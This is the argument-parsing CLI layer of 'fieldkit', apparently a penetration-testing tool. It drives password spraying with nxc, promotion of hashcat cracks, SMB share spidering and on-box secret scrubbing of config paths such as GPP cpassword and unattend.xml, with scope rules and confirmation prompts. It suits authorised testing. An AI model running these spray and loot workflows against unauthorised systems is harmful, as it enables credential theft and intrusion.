"""The `fieldkit` command tree.

Deliberately thin: parse arguments, call into ``state``/``config``/``creds``/
``scope``, print. All logic lives in those modules so it can be tested without a
subprocess, and nothing here runs at import time.

Phase 0 surface:

    fieldkit init [name]
    fieldkit config show | get KEY | set k=v … | unset KEY
    fieldkit add cred 'CORP/jdoe:Winter2025!' | --from-file creds.txt
    fieldkit add hosts 10.0.0.0/24 | scope.txt
    fieldkit status
"""
import argparse
import functools
import json
import os
import shutil
import signal
import sqlite3
import sys

from datetime import datetime, timezone

from . import (__version__, adcs as adcs_mod, archive as archive_mod,
               arsenal as arsenal_mod,
               bloodhound as bloodhound_mod, bridge as bridge_mod,
               classify as classify_mod, config as config_mod, creds as creds_mod,
               delegation as delegation_mod, escalate as escalate_mod,
               evasion as evasion_mod,
               executor as executor_mod, fs_scrub as fs_scrub_mod,
               hashcat as hashcat_mod, hostenum as hostenum_mod, ingest as ingest_mod,
               kb as kb_mod, kerberos as kerberos_mod, lab as lab_mod,
               mongodb as mongodb_mod, mssql as mssql_mod, nmap as nmap_mod,
               poc as poc_mod,
               postgres as postgres_mod, preflight as preflight_mod, recce as recce_mod,
               recce_transport as recce_transport_mod,
               runner as runner_mod,
               status_json as status_json_mod,
               watch as watch_mod,
               privesc as privesc_mod, provision as provision_mod,
               report as report_mod, scope as scope_mod,
               sharespider as sharespider_mod, spray as spray_mod,
               wordlist as wordlist_mod)
from .errors import ConfirmationError, FieldkitError
from .state import DB_ENV_VAR, Store, default_db_path

PROG = "fieldkit"


# ------------------------------------------------------------------------ plumbing

def _err(msg):
    print(f"{PROG}: error: {msg}", file=sys.stderr)


def _db_path(args):
    return args.db or default_db_path()


def _open_store(args):
    return Store.open(_db_path(args))


def _confirm(question, assume_yes=False):
    """Ask before anything is committed. Non-interactive callers must pass --yes."""
    if assume_yes:
        return True
    if not sys.stdin.isatty():
        raise ConfirmationError(
            "not running interactively and --yes was not given — refusing to guess; "
            "re-run with --yes once you have checked the parse above")
    try:
        answer = input(f"{question} [y/N] ").strip().lower()
    except EOFError:
        return False
    return answer in ("y", "yes")


def needs_engagement(fn):
    """Wrap a ``cmd_`` handler with the standard "open store + require engagement"
    prologue. The wrapped function is called as ``fn(args, store)``.

    Cuts the same three-line boilerplate ("with _open_store … require_engagement …")
    from every handler and consolidates it: one place to change if the setup ever
    grows a step (a preflight probe, a config load, an idle-DB warning)."""
    @functools.wraps(fn)
    def wrapper(args):
        with _open_store(args) as store:
            store.require_engagement()
            return fn(args, store)
    return wrapper


def needs_target(fn):
    """Same as :func:`needs_engagement`, plus resolves ``args.host`` to (host, cred).
    The wrapped function is called as ``fn(args, store, host, cred)``.

    Errors out (with the canonical message from :func:`_resolve_target`) before the
    handler runs — the handler sees only a valid target."""
    @functools.wraps(fn)
    def wrapper(args):
        with _open_store(args) as store:
            store.require_engagement()
            host, cred, err = _resolve_target(store, args.host)
            if err:
                _err(err)
                return 2
            return fn(args, store, host, cred)
    return wrapper


def _word(n, word):
    if n == 1:
        return word
    if word.endswith("y") and word[-2:-1] not in "aeiou":
        return word[:-1] + "ies"  # opportunity -> opportunities
    return word + "s"


def _plural(n, word):
    return f"{n} {_word(n, word)}"


# ------------------------------------------------------------------------ handlers

def cmd_init(args):
    path = _db_path(args)
    if os.path.exists(path):
        _err(f"{path} already exists — remove it or use --db for a second engagement")
        return 2
    name = args.name or os.path.basename(os.path.dirname(os.path.abspath(path))) or "engagement"
    with Store.create(path) as store:
        row = store.init_engagement(name)
        print(f"created {path}")
        print(f"engagement: {row['name']}  (schema v{store.schema_version()})")

    # Inline preflight so a tester learns about a missing required tool RIGHT HERE,
    # not five commands later when spray/enum/loot mysteriously errors out.
    pf_missing = preflight_mod.missing_required(preflight_mod.check())
    if pf_missing:
        print(f"\n⚠ required tools missing: {', '.join(r[0] for r in pf_missing)}")
        print(f"  the credential loop depends on them — install, then re-run "
              f"`{PROG} preflight` to confirm.")

    print(f"\nnext: {PROG} config set lhost=<your ip> lport=443 domain=<ad domain>")
    print(f"      {PROG} add hosts scope.txt")
    return 0


def cmd_config_show(args):
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        data = cfg.as_dict()
        overrides = cfg.overrides()
        width = max((len(k) for k in config_mod.KEYS), default=0)
        for key in sorted(config_mod.KEYS):
            value = data.get(key)
            marker = " " if cfg.is_set(key) else "."  # '.' = default, not set
            shown = value if value is not None else "-"
            print(f"{marker} {key.ljust(width)}  {shown}")
        if overrides:
            print("\nper-subnet lhost overrides:")
            for cidr, lhost in sorted(overrides.items()):
                print(f"    {cidr}  ->  {lhost}")
        print("\n('.' marks a default that is not explicitly set)")
    return 0


def cmd_config_get(args):
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        if args.key not in config_mod.KEYS:
            _err(f"unknown config key {args.key!r} — known keys: "
                 f"{', '.join(sorted(config_mod.KEYS))}")
            return 2
        value = cfg.get(args.key)
        if value is None:
            return 1
        print(value)
    return 0


def cmd_config_set(args):
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        pairs = [config_mod.parse_assignment(a) for a in args.assignments]
        stored = cfg.set_many(pairs, subnet=args.subnet)
        scope_note = f" (for {args.subnet})" if args.subnet else ""
        for key, value in stored.items():
            print(f"{key} = {value}{scope_note}")
    return 0


def cmd_config_unset(args):
    if not args.key and not args.subnet:
        _err("give a key to unset, or --subnet to drop an lhost override")
        return 2
    with _open_store(args) as store:
        cfg = config_mod.load(store)
        cfg.unset(args.key, subnet=args.subnet)
        print(f"unset {args.key}" + (f" for {args.subnet}" if args.subnet else ""))
    return 0


@needs_engagement
def cmd_add_cred(args, store):
    kwargs = dict(domain=args.domain, username=args.user, password=args.password,
                  nt_hash=args.hash, aes_key=args.aes, ccache=args.ccache,
                  ssh_key=args.ssh_key, local_auth=True if args.local else None)

    if args.from_file:
        with open(args.from_file, "r", errors="replace") as fh:
            parsed, errors = creds_mod.parse_credential_lines(fh.read(), **kwargs)
        for lineno, line, message in errors:
            _err(f"{args.from_file}:{lineno}: {message}  ({line})")
        if not parsed:
            _err("no usable credentials in the file")
            return 2
    else:
        if not args.spec and not any([args.password, args.hash, args.aes, args.ccache,
                                      args.ssh_key]):
            _err("give a credential — quote the whole thing:\n"
                 "  fieldkit add cred 'jdoe:Winter2025!'\n"
                 "  fieldkit add cred 'CORP/jdoe:Winter2025!'\n"
                 "  fieldkit add cred 'jdoe:<NT-hash>'\n"
                 "  (or --from-file <path> for one credential per line; see `add cred -h`)")
            return 2
        parsed = [creds_mod.parse_credential(args.spec, **kwargs)]

    for item in parsed:
        print(creds_mod.describe(item.credential))
        for note in item.notes:
            print(f"  note: {note}")
    if not _confirm(f"add {_plural(len(parsed), 'credential')}?", args.yes):
        print("aborted — nothing was stored")
        return 1

    added = reused = 0
    with store.transaction():
        for item in parsed:
            _, created = store.add_credential(item.credential, source=args.source)
            added += created
            reused += not created
    print(f"stored {_plural(added, 'credential')}"
          + (f", {reused} already known" if reused else ""))
    return 0


@needs_engagement
def cmd_add_hosts(args, store):
    if not args.targets and not args.file:
        _err("nothing to add — give IPs/CIDRs or a scope file")
        return 2

    targets, errors = scope_mod.read_targets(
        args.targets, file=args.file, max_expand=args.max_expand)
    for origin, lineno, line, message in errors:
        _err(f"{origin}:{lineno}: {message}  ({line})")
    if not targets:
        _err("no usable targets found")
        return 2

    added = enriched = out_of_scope = 0
    rejected = []
    with store.transaction():  # one commit for the whole scope file
        for ip, hostname in targets:
            if not store.in_scope(ip):
                out_of_scope += 1
                if len(rejected) < 5:
                    rejected.append(ip)
                continue
            _, created = store.add_host(
                ip, hostname=hostname or None, os_name=args.os,
                is_dc=True if args.dc else None, subnet=args.subnet)
            added += created
            enriched += not created
    total = store.counts()["hosts"]
    print(f"added {_plural(added, 'host')}"
          + (f", {enriched} already in the engagement" if enriched else "")
          + f" — {total} host(s) in the engagement")
    if out_of_scope:
        preview = ", ".join(rejected) + (f" (+{out_of_scope - len(rejected)} more)"
                                          if out_of_scope > len(rejected) else "")
        _err(f"{out_of_scope} rejected as outside the engagement scope: {preview}. "
             "See `fieldkit scope show`.")
    return 0 if not errors and not out_of_scope else 1


@needs_engagement
def cmd_scope_show(args, store):
    rows = store.scope_rules()
    if not rows:
        print("no scope rules — every IP is allowed (no enforcement)")
        print(f"tighten with: `{PROG} scope allow 10.0.0.0/24`")
        return 0
    print(f"engagement scope ({len(rows)} rule(s)):")
    for r in rows:
        added = (r["added"] or "").split("T")[0]
        notes = f"  # {r['notes']}" if r["notes"] else ""
        print(f"  {r['kind']:<5}  {r['cidr']:<20}  ({added}){notes}")
    return 0


@needs_engagement
def cmd_scope_add(args, store):
    kind = "deny" if args.deny else "allow"
    cidrs = []
    for target in args.cidrs:
        try:
            cid, created = store.scope_add(target, kind=kind, notes=args.notes)
        except ValueError as exc:
            _err(f"{target!r}: {exc}")
            return 2
        cidrs.append((target, created))
    for cidr, created in cidrs:
        print(f"{kind:<5}  {cidr}   ({'added' if created else 'already present'})")
    return 0


@needs_engagement
def cmd_scope_clear(args, store):
    n = len(store.scope_rules())
    if not n:
        print("no scope rules to clear")
        return 0
    prompt = (f"drop {_plural(n, 'scope rule')} — enforcement will be OFF and "
              "every IP will be allowed?")
    if not _confirm(prompt, args.yes):
        print("aborted — nothing changed")
        return 1
    store.scope_clear()
    print(f"cleared {_plural(n, 'scope rule')} — enforcement OFF")
    return 0


@needs_engagement
def cmd_ingest_nxc(args, store):
    if args.file and args.file != "-":
        with open(args.file, "r", errors="replace") as fh:
            text = fh.read()
    elif sys.stdin.isatty():
        _err("no capture given — pass a file or pipe nxc output on stdin")
        return 2
    else:
        text = sys.stdin.read()

    intent = ingest_mod.classify_nxc(text)
    if not intent.hosts and not intent.creds:
        _err("nothing recognizable in that capture — no [+] auth lines or [*] banners")
        return 2

    admin = intent.admin
    print(f"read {_plural(len(intent.hosts), 'host banner')}, "
          f"{_plural(len(intent.creds), 'valid credential')}"
          + (f" ({len(admin)} admin)" if admin else ""))
    for cred, result in intent.creds:
        tag = "  (Pwn3d!)" if result.admin else ""
        print(f"  {result.proto.lower():<5} {result.ip:<15} "
              f"{cred.principal} → {creds_mod.secret_display(cred)}{tag}")

    if not _confirm("record these into the engagement?", args.yes):
        print("aborted — nothing was stored")
        return 1

    rep = ingest_mod.apply_nxc(store, intent, source=args.source)
    print(f"stored {_plural(rep.creds_added, 'credential')}"
          + (f", {rep.creds_reused} already known" if rep.creds_reused else "")
          + f"; {rep.access_added} new access {_word(rep.access_added, 'record')}"
          + (f" ({rep.admin_added} admin)" if rep.admin_added else "")
          + f"; {rep.hosts_added} hosts added, {rep.hosts_enriched} enriched")
    return 0


@needs_engagement
def cmd_ingest_hashcat(args, store):
    """Read a hashcat potfile and promote cracked hashes to credentials.

    Matches each cracked ``hash:plaintext`` line against loot rows we already
    dumped (SAM/NTDS) — a match becomes a promoted credential ready to spray.
    A cracked hash we don't have loot for is kept as a `cracked_hash` loot row
    so a later dump can attribute it.
    """
    if args.file and args.file != "-":
        try:
            with open(args.file, "r", errors="replace") as fh:
                text = fh.read()
        except OSError as exc:
            _err(f"{args.file}: {exc}")
            return 2
    elif sys.stdin.isatty():
        _err("no potfile given — pass a hashcat potfile or pipe on stdin "
             "(`cat hashcat.potfile | fieldkit ingest hashcat -`)")
        return 2
    else:
        text = sys.stdin.read()

    entries = hashcat_mod.parse_potfile(text)
    if not entries:
        _err("no `hash:plaintext` lines in that file — either not a hashcat "
             "potfile, or empty. Format is one `<hash>:<plaintext>` per line.")
        return 2

    types = {}
    for e in entries:
        types[e.hash_type] = types.get(e.hash_type, 0) + 1
    type_summary = ", ".join(f"{n} {t}" for t, n in sorted(types.items(),
                                                            key=lambda p: -p[1]))
    n = len(entries)
    print(f"read {n} cracked hash{'' if n == 1 else 'es'}  ({type_summary})")

    if not _confirm("attribute against loot and promote to credentials?",
                    args.yes):
        print("aborted — nothing was stored")
        return 1

    rep = hashcat_mod.apply(store, entries)
    print(f"matched {rep.matched}/{rep.entries} cracked hashes to loot; "
          f"promoted {_plural(rep.creds_promoted, 'new credential')}"
          + (f"; kept {rep.unmatched_stored} unmatched pair(s) as loot"
             if rep.unmatched_stored else ""))
    if rep.matches:
        print("\nnewly attributed:")
        for (domain, user), plain, host_id in rep.matches[:10]:
            principal = f"{domain}\\{user}" if domain else user
            print(f"  {principal:<32} → {plain}")
        if len(rep.matches) > 10:
            print(f"  ... (+{len(rep.matches) - 10} more)")
    if rep.creds_promoted:
        print(f"\nnext: `{PROG} spray` to chase the newly promoted credentials")
    return 0


def cmd_ingest_recce(args):
    """Read a recce-bridge.json and fold recce's confirmed findings +
    hosts/services into state, so `analyze` promotes recce-confirmed hosts.
    Idempotent: re-ingest an updated bridge to upsert.
    """
    if args.file and args.file != "-":
        try:
            with open(args.file, "r", errors="replace") as fh:
                text = fh.read()
        except OSError as exc:
            _err(f"{args.file}: {exc}")
            return 2
    elif sys.stdin.isatty():
        _err("no bridge given — pass eng/fieldkit/recce-bridge.json or pipe on "
             "stdin. Written by `recce fieldkit-export`.")
        return 2
    else:
        text = sys.stdin.read()

    try:
        intent = recce_mod.parse(text)
    except recce_mod.RecceBridgeError as exc:
        _err(str(exc))
        return 2

    if not intent.hosts:
        _err("bridge has no hosts — nothing to ingest.")
        return 2

    n_svc = sum(len(h.services) for h in intent.hosts)
    n_conf = sum(len(h.findings) for h in intent.hosts)
    n_ver = sum(len(h.version_routes) for h in intent.hosts)
    tag = f" — engagement '{intent.engagement}'" if intent.engagement else ""
    print(f"read {_plural(len(intent.hosts), 'host')} with "
          f"{_plural(n_svc, 'service')}, "
          f"{_plural(n_conf, 'confirmed finding')}, "
          f"{_plural(n_ver, 'version→CVE lead')}{tag}")
    for h in intent.hosts[:12]:
        os_tag = f" ({h.os})" if h.os else ""
        f_hi = sum(1 for f in h.findings if f.severity in ("critical", "high"))
        f_tag = f"  [{f_hi} high+ finding(s)]" if f_hi else ""
        print(f"  {h.ip:<15} {h.hostname or '':<24}{os_tag}{f_tag}")
    if len(intent.hosts) > 12:
        print(f"  ... (+{len(intent.hosts) - 12} more)")

    if not _confirm("record into the engagement?", args.yes):
        print("aborted — nothing was stored")
        return 1

    with _open_store(args) as store:
        store.require_engagement()
        rep = recce_mod.apply(store, intent)
    print(f"stored {_plural(rep.hosts_added, 'host')}"
          + (f" ({rep.hosts_enriched} enriched)" if rep.hosts_enriched else "")
          + f", {_plural(rep.services_added, 'service')}"
          + (f" ({rep.services_enriched} enriched)" if rep.services_enriched else ""))
    print(f"folded {_plural(rep.confirmed_added, 'confirmed finding')}"
          + (f" ({rep.confirmed_seen} already known)" if rep.confirmed_seen else "")
          + f"; {_plural(rep.version_routes_added, 'version→CVE lead')}"
          + (f" ({rep.version_routes_seen} already known)" if rep.version_routes_seen else ""))
    if rep.out_of_scope:
        preview = ", ".join(rep.out_of_scope[:5]) + (
            f" (+{len(rep.out_of_scope) - 5} more)" if len(rep.out_of_scope) > 5 else "")
        _err(f"{len(rep.out_of_scope)} host(s) skipped — outside engagement scope: "
             f"{preview}. See `fieldkit scope show`.")
    if intent.users:
        print(f"bridge also carried {_plural(len(intent.users), 'username')} — "
              "seed a spray with: `fieldkit spray smb --users -` "
              "(paste the users list, or generate via `fieldkit usernames`).")
    return 0


@needs_engagement
def cmd_ingest_nmap(args, store):
    """Read nmap output and fold discovered hosts + services into state.

    Format auto-detects: ``-oX`` (XML, richest), ``-oN`` (normal), ``-oG``
    (grepable). ``-oA <prefix>`` writes all three; pass any of the resulting
    files (or pipe on stdin) and this figures out which format it is.
    """
    if args.file and args.file != "-":
        try:
            with open(args.file, "r", errors="replace") as fh:
                text = fh.read()
        except OSError as exc:
            _err(f"{args.file}: {exc}")
            return 2
    elif sys.stdin.isatty():
        _err("no capture given — pass an nmap output file or pipe on stdin. "
             "Supports -oX (xml), -oN (normal), -oG (grepable). E.g.: "
             "`nmap -oX - <targets> | fieldkit ingest nmap -`.")
        return 2
    else:
        text = sys.stdin.read()

    intent = nmap_mod.parse(text)
    if not intent.hosts:
        _err("no usable hosts in that file — either not nmap output, or all "
             "hosts were down. Supports -oX / -oN / -oG (auto-detected).")
        return 2

    n_services = sum(len(h.services) for h in intent.hosts)
    print(f"read {_plural(len(intent.hosts), 'up host')} with "
          f"{_plural(n_services, 'open service')}"
          + (f" — {intent.scanner}" if intent.scanner else ""))
    for h in intent.hosts[:12]:
        os_tag = f" ({h.os})" if h.os else ""
        ports = ", ".join(str(s.port) for s in h.services[:8])
        more = f" (+{len(h.services) - 8})" if len(h.services) > 8 else ""
        print(f"  {h.ip:<15} {h.hostname or '':<24}{os_tag}  {ports}{more}")
    if len(intent.hosts) > 12:
        print(f"  ... (+{len(intent.hosts) - 12} more)")

    if not _confirm("record into the engagement?", args.yes):
        print("aborted — nothing was stored")
        return 1

    rep = nmap_mod.apply(store, intent)
    print(f"stored {_plural(rep.hosts_added, 'host')}"
          + (f" ({rep.hosts_enriched} enriched)" if rep.hosts_enriched else "")
          + f", {_plural(rep.services_added, 'service')}"
          + (f" ({rep.services_enriched} enriched)" if rep.services_enriched else ""))
    if rep.out_of_scope:
        preview = ", ".join(rep.out_of_scope[:5]) + (
            f" (+{len(rep.out_of_scope) - 5} more)" if len(rep.out_of_scope) > 5 else "")
        _err(f"{len(rep.out_of_scope)} host(s) skipped — outside engagement scope: "
             f"{preview}. See `fieldkit scope show`.")
    return 0


def cmd_spray(args):
    if args.proto not in spray_mod.PROTOCOLS:
        _err(f"unknown proto {args.proto!r} — one of {', '.join(spray_mod.PROTOCOLS)}")
        return 2
    # --tmp: one-shot mode. Create a fresh engagement under /tmp so the tester
    # can spray a wordlist / new hosts without ceremony. State is still recorded
    # (evidence capture is load-bearing), just in a location that says "one-shot".
    if getattr(args, "tmp", False):
        import tempfile
        args.db = os.path.join(tempfile.mkdtemp(prefix="fk-oneshot-"), "engagement.db")
        with Store.create(args.db) as store:
            store.init_engagement("one-shot")
        print(f"one-shot engagement at {args.db}"
              f"  (inspect later: `{PROG} --db {args.db} status`)")
    with _open_store(args) as store:
        store.require_engagement()
        cfg = config_mod.load(store)
        # --hosts: add these IPs/CIDRs inline before spraying (skips the separate
        # `add hosts` step for a quick run).
        if args.hosts:
            targets, errors = scope_mod.read_targets(args.hosts)
            for origin, lineno, line, message in errors:
                _err(f"{origin}:{lineno}: {message}  ({line})")
            with store.transaction():
                for ip, hostname in targets:
                    if store.in_scope(ip):
                        store.add_host(ip, hostname=hostname or None)
            if targets:
                print(f"  scoped in {_plural(len(targets), 'host')} for this run")
        # wordlist mode: --userlist / --passlist (or the same config keys) present
        userlist = args.userlist or cfg.get("userlist")
        passlist = args.passlist or cfg.get("passlist")
        if args.wordlist or (userlist and passlist and not store.credentials()):
            return _cmd_spray_wordlist(args, store, cfg, userlist, passlist)

        hosts = store.hosts(subnet=args.subnet)
        creds = store.credentials()
        if not hosts:
            _err("no hosts in the engagement"
                 + (f" for {args.subnet}" if args.subnet else "")
                 + " — run `fieldkit add hosts` first (or pass `--hosts <IP|CIDR>`)")
            return 2
        if not creds:
            _err("no credentials to spray — run `fieldkit add cred` first, or run "
                 "`fieldkit spray --wordlist` with a userlist + passlist")
            return 2

        question = (f"validate {_plural(len(creds), 'credential')} across "
                    f"{_plural(len(hosts), 'host')} on {args.proto}? this runs nxc "
                    "against the client")
        if not _confirm(question, args.yes):
            print("aborted — nothing ran")
            return 1

        report = spray_mod.spray_loop(
            store, cfg, proto=args.proto, subnet=args.subnet, loot=not args.no_loot,
            with_policy=not args.no_policy, dc_ip=args.dc, timeout=args.timeout,
            on_event=lambda m: print(m))

    if report.aborted:
        _err(report.aborted)
        return 2
    print(f"\ndone in {report.rounds} round(s): "
          f"{report.valid} valid, {report.admin} admin; "
          f"looted {_plural(report.hosts_looted, 'host')}, "
          f"recovered {_plural(report.creds_recovered, 'credential')}")
    if report.creds_recovered:
        print("re-run `fieldkit spray` to chase the recovered credentials further")
    return 0


def _cmd_spray_wordlist(args, store, cfg, userlist, passlist):
    """Wordlist × password spray. Callable only from cmd_spray (the store is open)."""
    if not userlist or not passlist:
        _err("wordlist spray needs --userlist and --passlist (or `config set "
             "userlist=<path> passlist=<path>`)")
        return 2
    hosts = store.hosts(subnet=args.subnet)
    if not hosts:
        _err("no hosts in the engagement"
             + (f" for {args.subnet}" if args.subnet else "")
             + " — run `fieldkit add hosts` first")
        return 2

    def _count(p):
        return sum(1 for line in open(p, "r", errors="replace")
                   if line.strip() and not line.startswith("#"))

    try:
        users, passwords = _count(userlist), _count(passlist)
    except OSError as exc:
        _err(f"wordlist read error: {exc}")
        return 2
    combos = users * passwords
    question = (f"WORDLIST SPRAY on {args.proto}: {users} users × {passwords} "
                f"passwords = {combos} combinations across "
                f"{_plural(len(hosts), 'host')}. This CAN lock accounts if the "
                "domain has a lockout policy. Continue?")
    if not _confirm(question, args.yes):
        print("aborted — nothing ran")
        return 1
    rep = spray_mod.wordlist_spray(
        store, cfg, proto=args.proto, subnet=args.subnet,
        userlist=userlist, passlist=passlist, dc_ip=args.dc,
        allow_lockout_risk=args.allow_lockout_risk, timeout=args.timeout,
        on_event=lambda m: print(m))
    if rep.aborted:
        _err(rep.aborted)
        return 2
    print(f"\nwordlist spray: {rep.valid} valid, {rep.admin} admin, "
          f"{rep.creds_added} new credentials stored")
    if rep.creds_added:
        print("re-run `fieldkit spray` (stored mode) to chase the recovered credentials")
    return 0


def _first_dir(v):
    return v.split(",")[0].strip() if v else v


def _stage_dirs(cfg):
    # a comma-separated stage_win/stage_lin means "try these dirs"; single-dir rendering
    # (find_vector, run) uses the first.
    return dict(stage_win=_first_dir(cfg.get("stage_win")),
                stage_lin=_first_dir(cfg.get("stage_lin")))


def _refresh_from_recce(bridge_path, store):
    """Read a recce-bridge.json and apply it against ``store``. Returns
    0 on success, non-zero on any parse/read failure. Failures are
    non-fatal for the caller — ``analyze`` and ``escalate`` continue
    against the previously-ingested state so the operator still gets
    ranked output.

    Extracted so ``analyze --refresh`` and ``escalate --refresh``
    share one implementation. The stand-alone ``fieldkit recce``
    command has its own error-messaging wrapper (`cmd_recce`);
    this helper is the internal one-shot.
    """
    try:
        with open(bridge_path, "r", errors="replace") as fh:
            text = fh.read()
    except OSError as exc:
        _err(f"--refresh: cannot read {bridge_path}: {exc}")
        return 2
    try:
        intent = recce_mod.parse(text)
    except recce_mod.RecceBridgeError as exc:
        _err(f"--refresh: {exc}")
        return 2
    if not intent.hosts:
        _err(f"--refresh: {bridge_path} has no hosts to ingest")
        return 2
    try:
        recce_mod.apply(store, intent)
    except Exception as exc:                                  # noqa: BLE001
        _err(f"--refresh: apply failed: {exc}")
        return 2
    return 0


def _stage_dir_list(cfg, key):
    v = cfg.get(key)
    return [d.strip() for d in v.split(",") if d.strip()] if v else []


def _expand_stage_dirs(store, host_ip, host_os, cfg, vectors, dirs):
    """For each provisioned (stages/builds) vector, one copy per stage dir — so an
    'artifact didn't land' (delivery) miss advances the loop to the SAME tool in the next
    writable dir. Set e.g. `config set stage_win='C:\\Windows\\Temp,C:\\Users\\Public'`."""
    import dataclasses
    win = host_os == "windows"
    other = _first_dir(cfg.get("stage_lin" if win else "stage_win"))
    out = []
    for v in vectors:
        if not (getattr(v, "stages", ()) or getattr(v, "builds", ())):
            out.append(v)
            continue
        for d in dirs:
            kw = {"stage_win": d, "stage_lin": other} if win else \
                 {"stage_win": other, "stage_lin": d}
            v2 = privesc_mod.find_vector(store, host_ip, v.key, **kw)
            if v2:
                leaf = d.rstrip("\\/").replace("/", "\\").rsplit("\\", 1)[-1] or "dir"
                slug = "".join(c for c in leaf if c.isalnum()) or "dir"
                out.append(dataclasses.replace(v2, key=f"{v2.key}@{slug}"))
    return out


@needs_target
def cmd_spider(args, store, host, cred):
    """SMB share spider + scrub → loot → creds. Uses nxc's spider_plus module."""
    if host["os"] and host["os"] != "windows":
        _err(f"{args.host} is {host['os']} — SMB spidering is Windows-only")
        return 2

    out = args.out or os.path.join(_build_dir(), f"spider-{host['ip']}")
    os.makedirs(out, exist_ok=True)
    question = (f"spider readable SMB shares on {args.host}, download all files "
                f"under 50KB to {out}, and scrub them for secrets? this pulls a "
                "copy of the client's files")
    if not _confirm(question, args.yes):
        print("aborted — nothing ran")
        return 1

    rep = sharespider_mod.spider_and_scrub(
        store, host, cred, output_folder=out, on_event=lambda m: print(m),
        allow_promotion=not args.no_promote)

    if rep.error:
        _err(f"nxc did not run: {rep.error}")
        return 1
    kinds = {}
    for h in rep.hits:
        kinds[h.kind] = kinds.get(h.kind, 0) + 1
    print(f"\nspider {args.host}: {rep.shares_readable} share(s), "
          f"{rep.files_inventoried} file(s) inventoried, "
          f"{_plural(len(rep.hits), 'hit')}")
    for kind, n in sorted(kinds.items(), key=lambda p: (-p[1], p[0])):
        print(f"  {kind:<20} {n}")
    if rep.creds_promoted:
        print(f"\n{_plural(rep.creds_promoted, 'credential')} promoted to the loop — "
              "re-run `fieldkit spray` to chase them")
    print(f"\nclient-data corpus at {out} — recorded as a deletion obligation; "
          "`fieldkit report` will surface it")
    return 0


@needs_target
def cmd_scrub(args, store, host, cred):
    """On-box filesystem scrub: sweep common config paths for cleartext secrets.

    Linux: /etc, /opt, /root, /home, /var/www, /srv (`find | cat` pipeline).
    Windows: C:\\ProgramData, C:\\Users, C:\\inetpub, C:\\Program Files, ...
    (PowerShell `Get-ChildItem` pipeline).

    Uses the same scrubbers as `spider` — GPP cpassword, unattend.xml,
    web.config, kv-secrets in scripts, sensitive filenames.
    """
    default = (fs_scrub_mod.DEFAULT_WINDOWS_PATHS
               if (host["os"] or "linux") == "windows"
               else fs_scrub_mod.DEFAULT_LINUX_PATHS)
    paths = args.paths or None      # None -> default_paths for the OS
    shown = paths or default
    question = (f"scrub {host['ip']} for on-box secrets in "
                f"{', '.join(shown)}? "
                "(read-only; runs one pipeline on the target)")
    if not _confirm(question, args.yes):
        print("aborted — nothing ran")
        return 1
    rep = fs_scrub_mod.fs_scrub(store, host, cred, paths=paths,
                                on_event=lambda m: print(m))
    if rep.aborted:
        _err(rep.aborted)
        return 2
    kinds = {}
    for h in rep.hits:
        kinds[h.kind] = kinds.get(h.kind, 0) + 1
    print(f"\nfs-scrub {host['ip']}: {_plural(len(rep.hits), 'hit')}")
    for kind, n in sorted(kinds.items(), key=lambda p: (-p[1], p[0])):
        print(f"  {kind:<20} {n}")
    if rep.creds_promoted:
        print(f"\n{_plural(rep.creds_promoted, 'credential')} promoted — "
              "re-run `fieldkit spray` to chase them")
    return 0


@needs_engagement
def cmd_analyze(args, store):
    cfg = config_mod.load(store)
    # --refresh path: re-ingest a recce-bridge.json before ranking,
    # so `fieldkit analyze --refresh <path>` is the one-command
    # "pull the latest recce data + evaluate TTPs" workflow. Failures
    # in the ingest are surfaced but not fatal — the analyze still
    # runs against the previously-ingested state so the operator
    # gets SOMETHING out of the command.
    if getattr(args, "refresh", None):
        rc = _refresh_from_recce(args.refresh, store)
        if rc == 0:
            print(f"[refresh] re-ingested {args.refresh}\n")
        else:
            print("[refresh] ingest failed (continuing with existing state)\n")
    items = list(kb_mod.analyze(store))
    items += privesc_mod.vectors_from_state(store, **_stage_dirs(cfg))
    counts = store.counts()
    items.sort(key=lambda x: -x.score)

    if not items:
        if not counts["access"]:
            print("nothing to analyze yet — no access proven. Run `fieldkit spray` first.")
        else:
            print("no ranked opportunities from the current state — "
                  "`fieldkit enum <host>` to unlock privesc vectors.")
        return 0

    print(f"{_plural(len(items), 'move')}, best first "
          "(exploitability/safety/detection):\n")
    for i, item in enumerate(items, 1):
        where = f"  [{item.host}]" if item.host else ""
        print(f"{i}. {item.title}{where}")
        print(f"     rank: {item.axes}")
        print(f"     {item.detail}")
        if isinstance(item, privesc_mod.Vector):
            print(f"     command: {item.command}")
            if item.manual:   # prepared route — escalate won't fire it; prep renders the steps
                if item.evidence:
                    print(f"     why: {item.evidence}")
                print(f"     prep: {PROG} prep {item.host} {item.key}   (manual route)")
            else:
                print(f"     run: {PROG} run {item.host} {item.key}")
            if item.cleanup:
                print(f"     cleanup: {item.cleanup}")
        else:
            print(f"     next: {item.next_step}")
        if args.proof and item.safe_proof:
            print(f"     safe proof: {item.safe_proof}")
        print()
    return 0


def _resolve_target(store, ip):
    """(host_row, cred_row) for a target, or an error string. Shared by enum/run.

    Distinct failures the error message MUST NOT conflate:
      * ``ip`` looks like a CIDR (this command takes one IP);
      * ``ip`` is outside :meth:`Store.scope_rules` allow/deny (scope violation);
      * ``ip`` is not in the engagement database (needs ``add hosts``);
      * the engagement has NO credentials at all (needs ``add cred``);
      * credentials exist but none is proven to work on THIS host (needs a spray
        or an ingest of a prior nxc result to prove one).

    The last two are the ones testers most commonly confuse — the old message
    said "no credential is proven on X" for both, which read as "no cred exists"
    when the tester had just added one.
    """
    if "/" in ip:
        return None, None, (f"{ip} looks like a CIDR — this command takes a single "
                            "host. Use `add hosts <cidr>` to register the range, then "
                            "`spray` to sweep it, then run this on a specific IP.")
    if not store.in_scope(ip):
        return None, None, (f"{ip} is outside the engagement scope — see "
                            "`fieldkit scope show` for the current rules")
    host = store.host_by_ip(ip)
    if host is None:
        return None, None, (f"{ip} is not in the engagement — add it with "
                            "`fieldkit add hosts` (accepts single IPs, CIDR, or a "
                            "scope file)")
    cred = store.credential_with_access_on(host["id"])
    if cred is None:
        n_creds = store.counts()["credentials"]
        if n_creds == 0:
            note = ("no credentials in the engagement — add one with `fieldkit "
                    "add cred 'jdoe:Winter2025!'`, or spray a wordlist with "
                    "`fieldkit spray --wordlist --userlist … --passlist …`")
        else:
            note = (f"{_plural(n_creds, 'credential')} stored, but none is proven "
                    f"to work on {ip} yet — run `fieldkit spray` to validate them "
                    f"there (this command runs as a credential that ALREADY works)")
        return host, None, note
